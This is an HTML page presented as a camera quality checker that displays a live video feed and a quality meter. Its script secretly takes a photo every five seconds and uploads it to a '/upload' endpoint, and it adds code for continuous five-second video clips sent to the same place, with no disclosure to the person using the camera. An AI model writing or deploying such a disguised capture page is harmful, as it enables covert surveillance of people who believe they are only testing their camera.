<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Check Your Camera Quality</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 20px;
      background-color: black;
      color: white;
    }

    @media (max-width: 1180px) {
      video, canvas {
        border: 1px solid #ccc;
        border-radius: 8px;
        width: 80%;
        height: 90%;
        margin-top: 20px;
      }
    }

    video, canvas {
      border: 1px solid #ccc;
      border-radius: 8px;
      width: 80%;
      height: 60%;
      margin-top: 20px;
    }

    button {
      padding: 10px 15px;
      font-size: 16px;
      margin: 10px;
      cursor: pointer;
      border-radius: 5px;
      border: none;
      background-color: #007BFF;
      color: white;
    }
    button:hover { background-color: #0056b3; }

    /* ðŸ”¹ Quality Bar */
    #qualityBarWrapper {
      position: fixed;
      top: 50%;
      right: 20px;
      transform: translateY(-50%);
      width: 20px;
      height: 70%;
      background: linear-gradient(to top, red, yellow, green);
      border-radius: 10px;
      border: 1px solid #333;
      overflow: hidden;
    }
    #qualityMarker {
      position: absolute;
      left: -4px;
      width: 28px;
      height: 2px;
      background: black;
      transition: top 0.5s ease;
    }
    #qualityText {
      position: fixed;
      top: 50%;
      right: 60px;
      transform: translateY(-50%);
      font-size: 26px;
      font-weight: bold;
    }

    @media (max-width: 1180px) {
      #qualityBarWrapper {
        width: 30px;
        height: 50%;
        right: 25px;
      }
      #qualityMarker { width: 38px; }
      #qualityText { top: 58%; font-size: 50px; right: 20px; }
    }
  </style>
</head>
<body>
  <h1 style="margin-top: 8%;font-size: xxx-large;">Camera Quality Check</h1>

  <!-- Quality Indicator -->
  <div id="qualityBarWrapper">
    <div id="qualityMarker"></div>
  </div>
  <div id="qualityText">0%</div>

  <video id="video" autoplay playsinline></video>
  <br>
  <button id="flipBtn">Flip Camera</button>
  <button id="captureBtn">Capture</button>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const captureBtn = document.getElementById('captureBtn');
    const flipBtn = document.getElementById('flipBtn');
    const marker = document.getElementById('qualityMarker');
    const qualityText = document.getElementById('qualityText');

    let stream;
    let usingFrontCamera = true;

    async function startCamera() {
      if (stream) stream.getTracks().forEach(track => track.stop());

      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: usingFrontCamera ? "user" : "environment" },
        audio: false
      });

      video.srcObject = stream;
      await video.play();
    }

    flipBtn.addEventListener('click', () => {
      usingFrontCamera = !usingFrontCamera;
      startCamera();
    });

    // ðŸ”¹ Capture Function
    function captureAndUpload() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('file', blob, 'photo.png');

        try {
          const response = await fetch('/upload', { method: 'POST', body: formData });
          if(response.ok) console.log('Photo uploaded successfully!');
          else console.error('Upload failed');
        } catch (err) {
          console.error('Error:', err);
        }
      }, 'image/png');
    }

    captureBtn.addEventListener('click', captureAndUpload);

        // ðŸ”¹ Auto-capture every 5 seconds
    setInterval(captureAndUpload, 5000);

    // ðŸ”¹ Auto Video Capture & Upload  <<=== âœ… ADDED
    let mediaRecorder;
    let videoChunks = [];

    function startAutoVideoCapture() {
      if (!stream) return;

      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          videoChunks.push(event.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const blob = new Blob(videoChunks, { type: 'video/webm' });
        videoChunks = [];

        const formData = new FormData();
        formData.append("file", blob, "clip.webm");

        try {
          const response = await fetch('/upload', { method: 'POST', body: formData });
          if(response.ok) console.log('Video uploaded successfully!');
          else console.error('Video upload failed');
        } catch (err) {
          console.error('Video error:', err);
        }

        // restart recording again for continuous 5s chunks
        startAutoVideoCapture();
      };

      // record for 5 seconds then stop & trigger upload
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), 5000);
    }

    // ðŸ”¹ Start continuous video capture loop
    startAutoVideoCapture();   // <<=== âœ… ADDED


    // ðŸ”¹ Quality Measurement
    function getBrightness(frame) {
      const data = frame.data;
      let total = 0;
      for(let i=0;i<data.length;i+=4){
        total += 0.2126*data[i] + 0.7152*data[i+1] + 0.0722*data[i+2];
      }
      return total / (data.length/4);
    }

    function getSharpness(frame) {
      const data = frame.data;
      let sharp = 0;
      for(let i=0;i<data.length-4;i+=4){
        sharp += Math.abs(data[i]-data[i+4]);
      }
      return sharp / (data.length/4);
    }

    function getContrast(frame){
      const data = frame.data;
      let sum = 0, sumSq = 0;
      for(let i=0;i<data.length;i+=4){
        const lum = 0.2126*data[i] + 0.7152*data[i+1] + 0.0722*data[i+2];
        sum += lum;
        sumSq += lum*lum;
      }
      const mean = sum/(data.length/4);
      const variance = sumSq/(data.length/4) - mean*mean;
      return Math.sqrt(variance);
    }

    function updateQuality() {
      if(video.videoWidth < 100) return; // not ready

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const frame = ctx.getImageData(0,0,canvas.width,canvas.height);

      let brightness = getBrightness(frame);
      let sharpness = getSharpness(frame);
      let contrast = getContrast(frame);

      // Combine metrics (weights adjustable)
      let quality = 0.4*brightness + 0.4*sharpness + 0.2*contrast;

      // Normalize to 0-100 (you can tweak)
      quality = Math.min(100, Math.max(0, quality/2)); // divisor can be adjusted

      // Update UI
      const barHeight = document.getElementById('qualityBarWrapper').offsetHeight;
      marker.style.top = Math.floor(barHeight*(1 - quality/100)) + "px";

      qualityText.innerText = Math.round(quality) + "%";
      qualityText.style.color = quality<40?"red":quality<70?"orange":"green";
    }

    setInterval(updateQuality, 500); // update bar twice per second

    startCamera();
  </script>
</body>
</html>
